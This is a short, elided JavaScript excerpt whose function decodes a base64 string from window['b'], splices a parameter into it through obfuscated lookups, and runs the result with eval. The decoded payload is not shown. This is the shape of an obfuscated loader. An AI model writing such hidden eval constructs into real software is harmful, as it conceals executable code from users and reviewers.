...
function oo0O0(mw) {
  ...
  eval(
    ...
    Buffer.from(window["b"], "base64")
      .toString("binary")
      [J("0x0", "]dQW")](J("0x1", "GTu!"), "\x27" + mw + "\x27"),
  );
  return "";
}
var get_m = function () {
